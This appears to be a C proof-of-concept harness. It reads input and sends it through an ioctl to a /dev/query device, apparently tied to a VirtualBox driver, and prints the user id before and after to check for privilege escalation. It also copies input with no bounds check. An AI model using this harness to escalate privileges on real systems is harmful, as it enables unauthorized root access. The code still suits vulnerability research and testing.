#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#include "query_ioctl.h"

char *file_to_string(char *const filename, size_t *string_size);
char *fd_to_string(int fd, size_t *string_size);

char *file_to_string(char *const filename, size_t *string_size) {
  char *string = NULL;
  int fd = open(filename, O_RDONLY);
  if (fd == -1) {
    *string_size = 0;
    return NULL;
  }
  string = fd_to_string(fd, string_size);
  close(fd);
  return string;
}

char *fd_to_string(int fd, size_t *string_size) {
  const size_t buf_size = 1024;
  ssize_t bytes_read = 0;
  size_t buf_length = 0;
  char buf[buf_size];
  char *string = NULL;
  char *tmp = NULL;
  *string_size = 0;
  memset(buf, 0, buf_size);
  bytes_read = read(fd, buf, buf_size);
  if (bytes_read > 0) {
    buf_length = (size_t)bytes_read;
  }
  while (bytes_read > 0) {
    tmp = malloc(*string_size + buf_length);
    if (string != NULL) {
      memcpy(tmp, string, *string_size);
    }
    memcpy(tmp + *string_size, buf, buf_length);
    *string_size += buf_length;
    if (string != NULL) {
      free(string);
    }
    string = tmp;
    tmp = NULL;
    memset(buf, 0, buf_size);
    bytes_read = read(fd, buf, buf_size);
    if (bytes_read > 0) {
      buf_length = (size_t)bytes_read;
    }
  }
  return string;
}

int main(int argc, char *argv[]) {
  int fd;
  ssize_t msg_length = 0;
  char ioctl_device[] = "/dev/query";
  char *tmp;
  struct poc_msg msg;

  printf("getuid before: %d\n", getuid());

  if (argc > 1) {
    tmp = file_to_string(argv[1], &msg_length);
  } else {
    tmp = fd_to_string(STDIN_FILENO, &msg_length);
  }
  if (tmp == NULL) {
    printf("ERROR: You need to give some input to send to vbox_poc\n");
    return EXIT_FAILURE;
  }
  memcpy(msg.buffer, tmp, msg_length);
  free(tmp);
  msg.length = (__u32) msg_length;

  fd = open(ioctl_device, O_RDWR);
  if (fd < 0) {
    perror("open /dev/query: ");
    return EXIT_FAILURE;
  }

  if (ioctl(fd, VBOX_POC_SEND_MSG, &msg) == -1) {
    perror("when sending: ");
  }

  close(fd);

  printf("getuid after: %d\n", getuid());

  return 0;
}
